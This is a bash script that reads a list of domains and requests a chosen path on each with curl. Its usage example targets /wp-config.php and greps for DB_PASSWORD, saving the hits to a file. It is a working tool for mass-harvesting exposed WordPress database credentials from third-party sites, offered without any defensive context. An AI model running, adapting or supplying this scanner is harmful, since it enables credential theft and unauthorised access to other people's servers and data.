#!/bin/bash

if [ $# -ne 3 ]; then
  echo "Usage: $0 directory grep_value output"
  echo "Usage: $0 /wp-config.php DB_PASSWORD wp_hits.txt"
  exit 1
fi

directory=$1
grep_value=$2
wordlist=$3

counter=0;while read -r i; do counter=$((counter+1)); curl -s http://$i/$directory | grep $grep_value | tee -a wp_hits.txt && echo "$counter $i" | tee -a $wordlist && sleep 0.1 && clear ;done < domains.txt

cat $wordlist | grep $grep_value -A 1 > tmp.txt
cat tmp.txt > $wordlist
rm tmp.txt
echo "Done!"
